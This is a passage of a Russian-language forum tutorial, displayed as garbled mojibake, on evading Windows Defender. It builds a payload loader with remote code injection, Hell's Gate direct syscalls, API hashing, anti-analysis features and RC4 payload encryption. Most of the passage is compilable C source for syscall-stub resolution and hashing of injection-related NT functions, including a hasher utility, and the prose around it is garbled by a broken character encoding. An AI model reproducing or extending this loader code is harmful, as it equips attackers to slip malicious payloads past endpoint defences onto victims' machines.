–§—É–Ω–∫—Ü–∏—è IatCamouflage —Å–æ–¥–µ—Ä–∂–∏—Ç –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é A, –∫–æ—Ç–æ—Ä–∞—è —è–≤–ª—è–µ—Ç—Å—è —É–∫–∞–∑–∞—Ç–µ–ª–µ–º –Ω–∞ —Ü–µ–ª–æ–µ —á–∏—Å–ª–æ –∏ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è —Ä–∞–≤–Ω–æ–π –ø–µ—Ä–≤—ã–º —á–µ—Ç—ã—Ä–µ–º –±–∞–π—Ç–∞–º –±—É—Ñ–µ—Ä–∞, –≤–æ–∑–≤—Ä–∞—â–µ–Ω–Ω–æ–≥–æ —Ñ—É–Ω–∫—Ü–∏–µ–π Helper.<br />
<br />
<b><u>–ü–æ—Å–∫–æ–ª—å–∫—É —Ñ—É–Ω–∫—Ü–∏—è Helper –≤—Å–µ–≥–¥–∞ –±—É–¥–µ—Ç –≤–æ–∑–≤—Ä–∞—â–∞—Ç—å –∑–Ω–∞—á–µ–Ω–∏–µ –º–µ–Ω—å—à–µ 255, if-—É—Å–ª–æ–≤–∏–µ if (*A &gt; 350) –≤—Å–µ–≥–¥–∞ –±—É–¥–µ—Ç –ª–æ–∂–Ω—ã–º. </u></b>–ó–¥–µ—Å—å –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ —Ç–æ, —á—Ç–æ –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä –Ω–µ –∑–Ω–∞–µ—Ç –æ–± —ç—Ç–æ–º –∏, —Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ, –≤–∫–ª—é—á–∏—Ç —ç—Ç—É –ª–æ–≥–∏–∫—É –≤ —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –±–∏–Ω–∞—Ä–Ω—ã–π —Ñ–∞–π–ª.<br />
<br />
<b>–†–µ–∑—É–ª—å—Ç–∞—Ç—ã </b><br />
<br />
–°–∫–æ–º–ø–∏–ª–∏—Ä—É–π—Ç–µ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã–π –≤—ã—à–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞ –∏ –ø—Ä–æ–≤–µ—Ä—å—Ç–µ IAT –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞. –ö–∞–∫ –∏ –æ–∂–∏–¥–∞–ª–æ—Å—å, –¥–æ–±—Ä–æ–∂–µ–ª–∞—Ç–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ WinAPI –≤–Ω—É—Ç—Ä–∏ if-—É—Å–ª–æ–≤–∏—è —Ç–µ–ø–µ—Ä—å –≤–∏–¥–Ω—ã.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788720435.png"
		data-src="https://osint42.org/attachments/1746788720435-png.305/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788720435-png.305/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788720435.png"
			title="1746788720435.png"
			width="1322" height="884" loading="lazy" />
	</div><br />
<br />
<b>–≠—Ç–∏ –∏–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ, —á—Ç–æ–±—ã —Å–¥–µ–ª–∞—Ç—å –±–∏–Ω–∞—Ä–Ω—ã–π —Ñ–∞–π–ª –Ω–µ–∑–∞—Ä–∞–∑–Ω—ã–º –ø—Ä–∏ —Å—Ç–∞—Ç–∏—á–µ—Å–∫–æ–º –∞–Ω–∞–ª–∏–∑–µ. –° –¥—Ä—É–≥–æ–π —Å—Ç–æ—Ä–æ–Ω—ã, –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ WinAPI –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å —É–¥–∞–ª–µ–Ω—ã –∏–∑ IAT —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏—è API.</b></div>
						

							<h2>–û–±—Ö–æ–¥ Windows defender</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746788137329.png"
		data-src="https://osint42.org/attachments/1746788137329-png.261/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788137329-png.261/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788137329.png"
			title="1746788137329.png"
			width="688" height="384" loading="lazy" />
	</div><br />
<br />
<b>–í–≤–µ–¥–µ–Ω–∏–µ</b><br />
<br />
–î–æ —Å–∏—Ö –ø–æ—Ä –±—ã–ª–æ –ø—Ä–æ–¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–æ –º–Ω–æ–∂–µ—Å—Ç–≤–æ –º–µ—Ç–æ–¥–æ–≤ –∏ —Ç–µ—Ö–Ω–∏–∫ —Å–æ–∑–¥–∞–Ω–∏—è –∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∑–∞–≥—Ä—É–∑—á–∏–∫–∞ payload, –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–µ—Ç –æ–±—Ö–æ–¥–∏—Ç—å —Ä–∞–∑–ª–∏—á–Ω—ã–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã –∑–∞—â–∏—Ç—ã –æ—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –∫–æ–¥–∞. –≠—Ç–∞ —Å—Ç–∞—Ç—å—è –±—É–¥–µ—Ç —Ä–∞–±–æ—Ç–∞—Ç—å –Ω–∞–¥ —Å–æ–∑–¥–∞–Ω–∏–µ–º –ø–æ–ª–Ω–æ—Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ–≥–æ –∑–∞–≥—Ä—É–∑—á–∏–∫–∞ payload —Å –Ω—É–ª—è, —á—Ç–æ–±—ã —É–∫—Ä–µ–ø–∏—Ç—å –∑–Ω–∞–Ω–∏—è, –ø–æ–ª—É—á–µ–Ω–Ω—ã–µ –≤ –ø—Ä–µ–¥—ã–¥—É—â–∏—Ö —Ä–∞–∑–¥–µ–ª–∞—Ö.<br />
<br />
–°–æ–∑–¥–∞–π—Ç–µ –ø—É—Å—Ç–æ–π –ø—Ä–æ–µ–∫—Ç Visual Studio –∏ —Å–ª–µ–¥—É–π—Ç–µ –∑–∞ —ç—Ç–∏–º —Ä–∞–∑–¥–µ–ª–æ–º.<br />
<br />
<b>–•–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫–∏ –∑–∞–≥—Ä—É–∑—á–∏–∫–∞ payload </b><br />
<br />
–†–µ–∞–ª–∏–∑–æ–≤–∞–Ω–Ω—ã–π –∑–∞–≥—Ä—É–∑—á–∏–∫ payload –±—É–¥–µ—Ç –∏–º–µ—Ç—å —Å–ª–µ–¥—É—é—â–∏–µ —Ö–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫–∏:<br />
<br />
<ul>
<li data-xf-list-type="ul">–ü–æ–¥–¥–µ—Ä–∂–∫–∞ —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –≤–Ω–µ–¥—Ä–µ–Ω–∏—è –∫–æ–¥–∞</li>
<li data-xf-list-type="ul">–ò–Ω–∂–µ–∫—Ü–∏—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –ø—Ä—è–º—ã—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ —á–µ—Ä–µ–∑ Hell&#039;s Gate</li>
<li data-xf-list-type="ul">–•–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ API</li>
<li data-xf-list-type="ul">–§—É–Ω–∫—Ü–∏–∏ –ø—Ä–æ—Ç–∏–≤ –∞–Ω–∞–ª–∏–∑–∞</li>
<li data-xf-list-type="ul">–®–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ payload RC4</li>
<li data-xf-list-type="ul">–ü–æ–ø—ã—Ç–∫–∞ –≤–∑–ª–æ–º–∞ –∫–ª—é—á–∞ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è (–ë—Ä—É—Ç –∫–ª—é—á–∞ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è)</li>
<li data-xf-list-type="ul">–û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –∏–º–ø–æ—Ä—Ç–∞ –±–∏–±–ª–∏–æ—Ç–µ–∫ CRT</li>
</ul><br />
<b>–ù–∞—Å—Ç—Ä–æ–π–∫–∞ Hell&#039;s Gate</b><br />
<br />
–≠—Ç–æ—Ç –∑–∞–≥—Ä—É–∑—á–∏–∫ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –≤–Ω–µ–¥—Ä–µ–Ω–∏–µ payload —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –ø—Ä—è–º—ã—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤, –ø–æ–ª—É—á–µ–Ω–Ω—ã—Ö —Å –ø–æ–º–æ—â—å—é Hell&#039;s Gate.<br />
–î–ª—è –Ω–∞—á–∞–ª–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Å–æ–∑–¥–∞—Ç—å —Ñ–∞–π–ª—ã Structs.h, HellsGate.c –∏ HellAsm.asm.<br />
<br />
–í —ç—Ç–∏—Ö —Ñ–∞–π–ª–∞—Ö —Å–æ–¥–µ—Ä–∂–∞—Ç—Å—è –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø—Ä—è–º—ã—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤. –§–∞–π–ª Structs.h –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –Ω–µ–¥–æ–∫—É–º–µ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Å—Ç—Ä—É–∫—Ç—É—Ä Windows –∏ –≤–∫–ª—é—á–∞–µ—Ç—Å—è –≤ –ø–æ—Å–ª–µ–¥—É—é—â–∏–µ —Ñ–∞–π–ª—ã C. –í –Ω–µ–º —Å–æ–¥–µ—Ä–∂–∞—Ç—Å—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä, —Ç–∞–∫–∏—Ö –∫–∞–∫ PEB, TEB –∏ –¥—Ä—É–≥–∏–µ, –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã—Ö –¥–ª—è —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ Hell&#039;s Gate.<br />
<br />
–§–∞–π–ª HellAsm.asm <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/hellsgate.asm" target="_blank" class="link link--external" rel="noopener">–±—É–¥–µ—Ç —Ç–∞–∫–∏–º –∂–µ, –∫–∞–∫ –≤ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–∏.</a> –ß—Ç–æ –∫–∞—Å–∞–µ—Ç—Å—è HellsGate.c, –≤ –Ω–µ–º –±—É–¥—É—Ç —Å–ª–µ–¥—É—é—â–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏.<br />
<br />
HellsGate.c<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &quot;Structs.h&quot;

PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
    return (PTEB)__readgsqword(0x30);
#else
    return (PTEB)__readfsdword(0x16);
#endif
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
    // –ü–æ–ª—É—á–∏—Ç—å –∑–∞–≥–æ–ª–æ–≤–æ–∫ DOS
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
    if (pImageDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    // –ü–æ–ª—É—á–∏—Ç—å –∑–∞–≥–æ–ª–æ–≤–∫–∏ NT
    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader-&gt;e_lfanew);
    if (pImageNtHeaders-&gt;Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }

    // –ü–æ–ª—É—á–∏—Ç—å EAT
    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders-&gt;OptionalHeader.DataDirectory[0].VirtualAddress);
    return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfNameOrdinals);

    for (WORD cx = 0; cx &lt; pImageExportDirectory-&gt;NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        if (djb2(pczFunctionName) == pVxTableEntry-&gt;uHash) {
            pVxTableEntry-&gt;pAddress = pFunctionAddress;

            // –ë—ã—Å—Ç—Ä–æ–µ –∏ –≥—Ä—è–∑–Ω–æ–µ –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ, –µ—Å–ª–∏ —Ñ—É–Ω–∫—Ü–∏—è –±—ã–ª–∞ –ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–∞
            WORD cw = 0;
            while (TRUE) {
                // –ü—Ä–æ–≤–µ—Ä–∏—Ç—å, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ —ç—Ç–æ —Å–∏—Å—Ç–µ–º–Ω—ã–º –≤—ã–∑–æ–≤–æ–º, –≤ —ç—Ç–æ–º —Å–ª—É—á–∞–µ –º—ã —Å–ª–∏—à–∫–æ–º –¥–∞–ª–µ–∫–æ
                if (*((PBYTE)pFunctionAddress + cw) == 0x0f &amp;&amp; *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
                    return FALSE;

                // –ü—Ä–æ–≤–µ—Ä–∏—Ç—å, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ —ç—Ç–æ –≤–æ–∑–≤—Ä–∞—Ç–æ–º, –≤ —ç—Ç–æ–º —Å–ª—É—á–∞–µ, –≤–æ–∑–º–æ–∂–Ω–æ, –º—ã —Ç–æ–∂–µ —Å–ª–∏—à–∫–æ–º –¥–∞–ª–µ–∫–æ
                if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
                    return FALSE;

                // –ü–µ—Ä–≤—ã–µ –±–∞–π—Ç—ã –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å:
                //    MOV R10, RCX
                //    MOV RCX, &lt;syscall&gt;
                if (*((PBYTE)pFunctionAddress + cw) == 0x4c
                    &amp;&amp; *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
                    &amp;&amp; *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
                    &amp;&amp; *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
                    &amp;&amp; *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
                    &amp;&amp; *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
                    BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
                    BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
                    pVxTableEntry-&gt;wSystemCall = (high &lt;&lt; 8) | low;
                    break;
                }

                cw++;
            };
        }
    }

    if (pVxTableEntry-&gt;wSystemCall != NULL)
        return TRUE;
    else
        return FALSE;
}</code></pre>
	</div>
</div><br />
–ö–æ–¥ –≤—ã—à–µ –Ω–µ –∏–º–µ–µ—Ç –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã VX_TABLE_ENTRY –∏–ª–∏ —Ñ—É–Ω–∫—Ü–∏–∏ djb2. –î–ª—è —Ä–µ—à–µ–Ω–∏—è —ç—Ç–æ–π –ø—Ä–æ–±–ª–µ–º—ã –±—É–¥—É—Ç —Å–æ–∑–¥–∞–Ω—ã –¥–≤–∞ –Ω–æ–≤—ã—Ö —Ñ–∞–π–ª–∞: WinApi.c –∏ Common.h.<br />
<br />
WinApi.c - –≠—Ç–æ—Ç —Ñ–∞–π–ª –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è —Ñ—É–Ω–∫—Ü–∏–π –∑–∞–º–µ–Ω—ã –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ CRT –∏ —Ñ—É–Ω–∫—Ü–∏–π —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è —Å—Ç—Ä–æ–∫, –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã—Ö –≤ Hell&#039;s Gate –∏ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è API.<br />
<br />
Common.h - –≠—Ç–æ—Ç —Ñ–∞–π–ª –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç –æ–±—â–∏–µ –ø—Ä–æ—Ç–æ—Ç–∏–ø—ã —Ñ—É–Ω–∫—Ü–∏–π –¥–ª—è –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ –≤—ã–∑–æ–≤–∞ —Ñ—É–Ω–∫—Ü–∏–∏ –∏–∑ –¥—Ä—É–≥–æ–≥–æ —Ñ–∞–π–ª–∞, –∞ —Ç–∞–∫–∂–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä, –∑–Ω–∞—á–µ–Ω–∏—è —Ö–µ—à–µ–π —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ –∏ WinAPI.<br />
<br />
–§—É–Ω–∫—Ü–∏—è —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è —Å—Ç—Ä–æ–∫ djb2 –∑–∞–º–µ–Ω—è–µ—Ç—Å—è —Å–ª–µ–¥—É—é—â–∏–º–∏ —Ñ—É–Ω–∫—Ü–∏—è–º–∏ HashStringJenkinsOneAtATime32BitA/W, –∏–∑–º–µ–Ω—è—è —Ç–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º –∏—Å—Ö–æ–¥–Ω—ã–π –∞–ª–≥–æ—Ä–∏—Ç–º —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è —Å—Ç—Ä–æ–∫, –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–π –≤ Hell&#039;s Gate.<br />
<br />
WinApi.c<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &quot;Structs.h&quot;
#include &quot;Common.h&quot;

UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String)
{
    SIZE_T Index = 0;
    UINT32 Hash = 0;
    SIZE_T Length = lstrlenA(String);

    while (Index != Length)
    {
        Hash += String[Index++];
        Hash += Hash &lt;&lt; INITIAL_SEED;
        Hash ^= Hash &gt;&gt; 6;
    }

    Hash += Hash &lt;&lt; 3;
    Hash ^= Hash &gt;&gt; 11;
    Hash += Hash &lt;&lt; 15;

    return Hash;
}

UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String)
{
    SIZE_T Index = 0;
    UINT32 Hash = 0;
    SIZE_T Length = lstrlenW(String);

    while (Index != Length)
    {
        Hash += String[Index++];
        Hash += Hash &lt;&lt; INITIAL_SEED;
        Hash ^= Hash &gt;&gt; 6;
    }

    Hash += Hash &lt;&lt; 3;
    Hash ^= Hash &gt;&gt; 11;
    Hash += Hash &lt;&lt; 15;

    return Hash;
}</code></pre>
	</div>
</div><br />
<b>Common.h</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#pragma once
#include &lt;Windows.h&gt;

// –ù–∞—á–∞–ª—å–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –¥–ª—è —Ñ—É–Ω–∫—Ü–∏–∏ —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è HashStringJenkinsOneAtATime32BitA/W –≤ &#039;WinApi.c&#039;
#define INITIAL_SEED    8

UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String);
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String);

#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))

// –≠—Ç–æ –ø—Ä–æ—Ç–æ—Ç–∏–ø—ã —Ñ—É–Ω–∫—Ü–∏–π - —Ñ—É–Ω–∫—Ü–∏–∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω—ã –≤ &#039;HellsGate.c&#039;
PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory);
BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry);

// –≠—Ç–æ –ø—Ä–æ—Ç–æ—Ç–∏–ø—ã —Ñ—É–Ω–∫—Ü–∏–π - —Ñ—É–Ω–∫—Ü–∏–∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω—ã –≤ &#039;HellAsm.asm&#039;
extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();</code></pre>
	</div>
</div><br />
–û–ø—Ä–µ–¥–µ–ª–∏—Ç–µ —Å—Ç—Ä—É–∫—Ç—É—Ä—É VX_TABLE_ENTRY –≤ —Ñ–∞–π–ª–µ Common.h, –∞ –∑–∞—Ç–µ–º –æ–±–Ω–æ–≤–∏—Ç–µ —Ñ–∞–π–ª HellsGate.c, —á—Ç–æ–±—ã –≤–∫–ª—é—á–∏—Ç—å –µ–µ –∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å HASHA –≤–º–µ—Å—Ç–æ djb2 –≤ –∫–∞—á–µ—Å—Ç–≤–µ —Ñ—É–Ω–∫—Ü–∏–∏ —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è.<br />
<br />
VX_TABLE_ENTRY<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>typedef struct _VX_TABLE_ENTRY {
    PVOID   pAddress;
    UINT32  uHash;
    WORD    wSystemCall;
} VX_TABLE_ENTRY, *PVX_TABLE_ENTRY;</code></pre>
	</div>
</div><br />
<b>–í—ã—á–∏—Å–ª–µ–Ω–∏–µ —Ö–µ—à–µ–π —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤</b><br />
<br />
–î–ª—è –≤—ã—á–∏—Å–ª–µ–Ω–∏—è –∑–Ω–∞—á–µ–Ω–∏–π —Ö–µ—à–µ–π —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ –∏ –≤—ã–≤–æ–¥–∞ –∏—Ö –Ω–∞ –∫–æ–Ω—Å–æ–ª—å –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Å–æ–∑–¥–∞—Ç—å –Ω–æ–≤—ã–π –ø—Ä–æ–µ–∫—Ç. –ü—Ä–æ–µ–∫—Ç Hasher –±—É–¥–µ—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å –æ–¥–∏–Ω —Ñ–∞–π–ª –Ω–∞ C, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–∫–∞–∑–∞–Ω –Ω–∏–∂–µ.<br />
<br />
Hasher.c<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;

#define STR &quot;_JOAA&quot;
#define INITIAL_SEED 8

UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String)
{
    SIZE_T Index = 0;
    UINT32 Hash = 0;
    SIZE_T Length = lstrlenA(String);

    while (Index != Length)
    {
        Hash += String[Index++];
        Hash += Hash &lt;&lt; INITIAL_SEED;
        Hash ^= Hash &gt;&gt; 6;
    }

    Hash += Hash &lt;&lt; 3;
    Hash ^= Hash &gt;&gt; 11;
    Hash += Hash &lt;&lt; 15;

    return Hash;
}

UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String)
{
    SIZE_T Index = 0;
    UINT32 Hash = 0;
    SIZE_T Length = lstrlenW(String);

    while (Index != Length)
    {
        Hash += String[Index++];
        Hash += Hash &lt;&lt; INITIAL_SEED;
        Hash ^= Hash &gt;&gt; 6;
    }

    Hash += Hash &lt;&lt; 3;
    Hash ^= Hash &gt;&gt; 11;
    Hash += Hash &lt;&lt; 15;

    return Hash;
}

int main() {

    printf(&quot;#define %s%s \t0x%0.8X \n&quot;, &quot;NtCreateSection&quot;, STR, HashStringJenkinsOneAtATime32BitA(&quot;NtCreateSection&quot;));
    printf(&quot;#define %s%s \t0x%0.8X \n&quot;, &quot;NtMapViewOfSection&quot;, STR, HashStringJenkinsOneAtATime32BitA(&quot;NtMapViewOfSection&quot;));
    printf(&quot;#define %s%s \t0x%0.8X \n&quot;, &quot;NtUnmapViewOfSection&quot;, STR, HashStringJenkinsOneAtATime32BitA(&quot;NtUnmapViewOfSection&quot;));
    printf(&quot;#define %s%s \t0x%0.8X \n&quot;, &quot;NtClose&quot;, STR, HashStringJenkinsOneAtATime32BitA(&quot;NtClose&quot;));
    printf(&quot;#define %s%s \t0x%0.8X \n&quot;, &quot;NtCreateThreadEx&quot;, STR, HashStringJenkinsOneAtATime32BitA(&quot;NtCreateThreadEx&quot;));
    printf(&quot;#define %s%s \t0x%0.8X \n&quot;, &quot;NtWaitForSingleObject&quot;, STR, HashStringJenkinsOneAtATime32BitA(&quot;NtWaitForSingleObject&quot;));

    return 0;
}</code></pre>
	</div>
</div><br />
<b>–†–µ–∑—É–ª—å—Ç–∞—Ç—ã Hasher</b><br />
<br />
